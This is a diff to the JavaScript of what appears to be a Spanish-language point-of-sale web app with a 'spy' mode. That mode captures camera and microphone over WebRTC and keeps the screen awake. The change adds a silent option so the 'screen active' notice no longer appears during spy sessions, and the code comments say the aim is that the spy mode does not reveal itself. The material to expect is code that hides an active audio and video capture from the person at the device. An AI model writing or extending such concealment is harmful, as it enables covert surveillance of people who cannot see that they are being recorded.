@@ -2103,6 +2103,9 @@
     // ── Wake Lock · mantener pantalla activa durante la sesión de caja ──
     let _meWakeSentinel = null;
     let _meWakeShouldBeOn = false;
+    // [v2.7.42] Recuerda si la última activación fue silenciosa (espía).
+    // Cuando visibilitychange re-acquire automáticamente, respeta el modo.
+    let _meWakeSilenciosoFlag = false;
 
     // [v2.5.12] Chip wake-lock como TOAST efímero (3s). Antes era permanente
     // arriba a la derecha y tapaba iconos del header. La función sigue ACTIVA
@@ -2130,17 +2133,20 @@
       }, 3000);
     }
 
-    async function _meAcquireWakeLock() {
+    // [v2.7.42] silencioso=true → no muestra chip "🔆 Pantalla activa" (espía no delata).
+    // El flag se persiste en _meWakeSilenciosoFlag para que las reactivaciones
+    // automáticas (visibilitychange) respeten el modo de la última solicitud.
+    async function _meAcquireWakeLock(silencioso) {
       _meWakeShouldBeOn = true;
-      _meWakeRenderChip();
+      _meWakeSilenciosoFlag = !!silencioso;
+      if (!silencioso) _meWakeRenderChip();
       try {
         if (!('wakeLock' in navigator)) return;
         if (_meWakeSentinel && !_meWakeSentinel.released) return;
         _meWakeSentinel = await navigator.wakeLock.request('screen');
         _meWakeSentinel.addEventListener('release', () => {
-          // Si seguimos queriendo, reacquire al volver visible
           if (_meWakeShouldBeOn && document.visibilityState === 'visible') {
-            setTimeout(_meAcquireWakeLock, 200);
+            setTimeout(() => _meAcquireWakeLock(_meWakeSilenciosoFlag), 200);
           }
         });
       } catch(_){ /* el SO podría rechazar (modo ahorro) */ }
@@ -2156,7 +2162,9 @@
     }
 
     document.addEventListener('visibilitychange', () => {
-      if (document.visibilityState === 'visible' && _meWakeShouldBeOn) _meAcquireWakeLock();
+      if (document.visibilityState === 'visible' && _meWakeShouldBeOn) {
+        _meAcquireWakeLock(_meWakeSilenciosoFlag);
+      }
     });
 
     window._meAcquireWakeLock = _meAcquireWakeLock;
@@ -10876,7 +10884,7 @@
             if (!_espiaCli) return;
             _espiaCli._iceServers = iceServers;
             // [v2.7.41] Forzar Wake Lock al iniciar espía
-            try { if (window._meAcquireWakeLock) window._meAcquireWakeLock(); } catch(_){}
+            try { if (window._meAcquireWakeLock) window._meAcquireWakeLock(true); } catch(_){}
             try {
                 // [v2.7.17] 1) Audio + cámara con facingMode fallback
                 // Cascada: environment (trasera) → user (frontal) → cualquiera (laptop sin trasera)
@@ -10957,7 +10965,7 @@
                         console.log('[espia visibility] visible · reanimar');
                         _espiaCli._ultimaVisible = Date.now();
                         // [v2.7.41] Re-forzar Wake Lock (browser libera al hidden)
-                        try { if (window._meAcquireWakeLock) window._meAcquireWakeLock(); } catch(_){}
+                        try { if (window._meAcquireWakeLock) window._meAcquireWakeLock(true); } catch(_){}
                         if (pcAhora.connectionState !== 'closed') {
                             let estICE = '';
                             try { estICE = pcAhora.iceConnectionState; } catch(_){ return; }
